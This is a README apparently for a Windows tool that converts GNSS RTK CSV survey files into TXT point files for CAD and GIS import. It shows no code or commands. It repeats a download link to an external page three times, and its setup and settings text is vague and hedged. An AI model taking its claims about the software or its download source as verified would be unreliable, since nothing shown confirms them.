# Extractor de Coordenadas RTK v1.2.0 - GNSS CSV to TXT converter 2026

> **Extractor de Coordenadas RTK** turns high-density GNSS RTK CSV records into structured TXT point files on Windows, helping streamline topography preparation for Civil 3D, AutoCAD, and QGIS in version 1.2.0.

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/caleb-king46/extractor-coordenadas-rtk?style=flat-square)](https://github.com/caleb-king46/extractor-coordenadas-rtk)

---

<p align="center">
  <a href="https://caleb-king46.github.io/extractor-coordenadas-rtk/">
    <img src="https://img.shields.io/badge/Download-Extractor%20de%20Coordenadas%20RTK%20Latest-brightgreen?style=for-the-badge" alt="Download Extractor de Coordenadas RTK">
  </a>
</p>

> **[Download - Extractor de Coordenadas RTK v1.2.0](https://caleb-king46.github.io/extractor-coordenadas-rtk/)**

---

[Download Latest Build](https://caleb-king46.github.io/extractor-coordenadas-rtk/)

---

## What Extractor de Coordenadas RTK does

Extractor de Coordenadas RTK is a Windows tool designed to take GNSS RTK CSV exports and reshape them into TXT point files with minimal effort. Instead of handling dense survey tables manually, it gives you a cleaner output format that fits more naturally into mapping and drafting workflows.

It is aimed at surveyors, topography crews, and CAD or GIS professionals who need point data in a form that is easier to reuse. Coordinate, elevation, and description values are organized so the resulting TXT files can be brought into Civil 3D, AutoCAD, and QGIS with less rework.

---

## Key capabilities

- Converts GNSS RTK CSV files into clean TXT point files
- Generates output ready for Civil 3D, AutoCAD, and QGIS import
- Automatically finds the most common description value
- Supports drag-and-drop for files and folders
- Handles multiple CSV files in batch
- Allows selection of the elevation and description fields
- Appends numeric suffixes when output names would clash
- Simplifies topography point export on Windows

---

## Setup

1. Download the latest build from the project download page.
2. Extract the package if it is distributed as a compressed archive.
3. Place the app in a folder you can access easily.
4. Launch the application on Windows.

If you are working from the repository source, clone or download the project files and open the included app entry point from your local environment.

---

## How to use it

1. Open the application.
2. Drag one or more CSV files, or a folder containing CSV files, into the window.
3. Select the fields you want to use for elevation and description if needed.
4. Start the conversion process.
5. Collect the generated TXT files and import them into your CAD or GIS workflow.

Typical workflow:

- Export point data from your GNSS RTK receiver as CSV
- Load the CSV into Extractor de Coordenadas RTK
- Convert the file set in one pass
- Use the TXT output in Civil 3D, AutoCAD, or QGIS

---

## Configuration

If your build includes settings, they are typically stored with the application or alongside the user profile used by Windows. Field selection and output behavior are handled from the app interface, so no advanced setup is required for basic use.

Example of the kind of options you may manage in the tool:

    elevation_field: "Elevation"
    description_field: "Description"
    output_format: "TXT"
    batch_mode: true

---

## Requirements

- Windows operating system
- GNSS RTK CSV input files
- Enough local storage to save generated TXT outputs
- A compatible workflow for Civil 3D, AutoCAD, or QGIS if you plan to import the results
- Repository files or a packaged release of version 1.2.0

---

## FAQ

**Can I process more than one CSV file at a time?**  
Yes. The tool supports batch processing for multiple CSV files and folders.

**Does it work with point workflows for CAD and GIS software?**  
Yes. The exported TXT files are designed for point import workflows used in Civil 3D, AutoCAD, and QGIS.

**What if two output files have the same name?**  
The app handles duplicate names by adding numeric suffixes to keep the outputs distinct.

**Can I choose which data columns are used?**  
Yes. You can select the elevation and description fields as part of the conversion workflow.

**Where do I get updates?**  
Use the download link above to check the latest build and release availability.

**I am having trouble importing the TXT file. What should I check?**  
Verify that the source CSV contains the expected coordinate, elevation, and description data, and confirm that the selected fields match your dataset structure.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
